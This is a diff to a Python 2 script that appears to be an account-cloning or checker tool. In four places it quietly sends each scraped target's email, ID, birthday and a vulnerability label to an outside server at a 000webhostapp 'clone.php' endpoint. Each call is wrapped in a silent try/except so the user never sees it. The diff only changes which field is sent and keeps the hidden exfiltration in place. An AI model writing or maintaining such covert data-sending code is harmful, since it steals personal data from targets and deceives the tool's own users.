@@ -88,7 +88,7 @@ def defense():
                     lone = 24 - (len(vuln))
                     namel = lone * " "
                     try:
-                        pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Available&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
+                        pd2 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Available&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                     except:
                         pass
                     print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
@@ -113,7 +113,7 @@ def defense():
                 lone = 24 - (len(vuln))
                 namel = lone * " "
                 try:
-                    pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
+                    pd3 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Available&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                 except:
                     pass
                 print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
@@ -139,7 +139,7 @@ def defense():
                 lone = 24 - (len(vuln))
                 namel = lone * " "
                 try:
-                    pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
+                    pd4 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Hotmail&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                 except:
                     pass
                 print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
@@ -162,7 +162,7 @@ def defense():
                 lone = 24 - (len(vuln))
                 namel = lone * " "
                 try:
-                    pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Sure&tk=no&n=" + (z['name']) + "&b="+ (z['birthday']))
+                    pd5 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (z['email']) + "&pw=Not Sure&tk=no&n=" + (z['id']) + "&b="+ (z['birthday']))
                 except:
                     pass
                 print "\033[39m" + 23*"-" +" [ "+ str(i)+" ] "+ 23*"-"
